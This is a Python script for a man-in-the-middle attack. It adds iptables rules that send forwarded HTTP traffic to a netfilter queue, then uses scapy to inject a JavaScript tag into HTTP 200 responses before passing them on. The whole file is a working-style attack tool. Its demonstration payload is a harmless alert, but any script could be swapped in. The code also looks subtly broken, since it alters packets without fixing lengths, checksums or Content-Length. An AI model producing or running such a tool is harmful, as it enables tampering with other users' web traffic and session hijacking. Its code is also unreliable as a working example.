from scapy.all import IP, TCP, Raw
from netfilterqueue import NetfilterQueue

# JavaScript code to inject
js_code = "<script>alert('This is an injected script!');</script>"

def process_packet(packet):
    # Read packet data
    pkts = packet.get_payload()

    # Unpack the packet
    scapy_packet = IP(pkts)

    try:
        # Check if it's an HTTP response
        if scapy_packet.haslayer(TCP) and scapy_packet.haslayer(Raw):
            if scapy_packet[TCP].dport == 80 or scapy_packet[TCP].sport == 80:
                if b'HTTP/1.1 200 OK' in scapy_packet[Raw].load:
                    # Extract payload
                    headers, body = scapy_packet[Raw].load.split(b'\r\n\r\n', 1)
                    
                    # Inject JS code into the body
                    modified_body = body + js_code.encode()

                    # Reconstruct the HTTP packet with the modified body
                    modified_packet = scapy_packet.copy()
                    modified_packet[Raw].load = headers + b'\r\n\r\n' + modified_body
                    
                    # Replace the original with the modified packet
                    packet.set_payload(bytes(modified_packet))
    except:
        pass

    # Accept the packet for further processing (forward it)
    packet.accept()

def main():
    # Redirect HTTP traffic to queue number 1
    command = "iptables -I FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1"
    command2 = "iptables -I FORWARD -p tcp --sport 80 -j NFQUEUE --queue-num 1"
    os.system(command)
    os.system(command2)

    # Create a NetfilterQueue object and bind it to queue number 1
    nf_queue = NetfilterQueue()
    nf_queue.bind(1, process_packet)
    
    try:
        print("Starting packet interception...")
        # Start listening to packets
        nf_queue.run(block=False)
    except KeyboardInterrupt:
        print("Stopping packet interception...")
        # Restore iptables to their original state
        os.system("iptables -D FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1")
        os.system("iptables -D FORWARD -p tcp --sport 80 -j NFQUEUE --queue-num 1")
    finally:
        nf_queue.unbind()

if __name__ == "__main__":
    import os
    main()